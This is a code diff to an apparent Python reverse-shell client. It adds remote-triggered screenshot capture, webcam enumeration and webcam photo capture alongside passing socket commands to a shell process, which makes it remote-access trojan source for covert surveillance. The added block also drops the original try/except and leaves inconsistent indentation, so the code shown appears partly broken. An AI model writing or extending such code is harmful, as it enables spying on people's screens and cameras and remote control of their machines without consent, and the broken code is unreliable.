@@ -1,17 +1,52 @@
-import socket,subprocess,threading
-import signal
+import socket,subprocess,threading,pygame,pyscreenshot,datetime,re
+import pygame.camera
+
+def send_data_to_process(process,data):
+    process.stdin.write(data)
+    process.stdin.flush()
+
+def screenshot():
+    image = pyscreenshot.grab()
+    date= datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
+    filename="screenshot-"+date+".png"
+    image.save(filename)
+    return filename
+
+def cam_capture(cam_id):
+    cam = pygame.camera.Camera(cam_id,(1280,720))
+    cam.start()
+    image = cam.get_image()
+    date= datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
+    filename="cam-"+date+".png"
+    pygame.image.save(image,filename)
+    return filename
 
 def receive_data(s, p):
-    try:
+        pygame.init()
+        pygame.camera.init()
         while 1:
-            data = s.recv(1024)                
+            data = s.recv(1024)
             if len(data) > 0:
                 if data.decode() == "stop\n": #stop the child process and loop in try_to_connect function
                     p.terminate()
-                p.stdin.write(data)
-                p.stdin.flush()
-    except:
-        pass
+                elif data.decode() == "ss\n": #save a screenshot of the screen
+                    filename = screenshot()
+                    send_data_to_process(p,("image saved: "+filename+"\n").encode())
+                elif data.decode() == "list\n": #send a list of cameras
+                    data = ""
+                    for cam in pygame.camera.list_cameras():
+                        data=data+str(cam)+"\n"
+                    send_data_to_process(p,data.encode())
+                elif re.match(r"^capture [0-9]$",data.decode()): #save a picture of camera
+                    cam_id = data.decode().replace("capture ","").rstrip("\n")
+                    cam_id = int(cam_id)
+                    if cam_id in pygame.camera.list_cameras():
+                        filename = cam_capture(cam_id)
+                        send_data_to_process(p,("image saved"+filename+"\n").encode())
+                    else:
+                        send_data_to_process(p,"No cam with this id\n".encode())
+                else:
+                    send_data_to_process(p,data)
 
 def send_data(s, p):
     try:
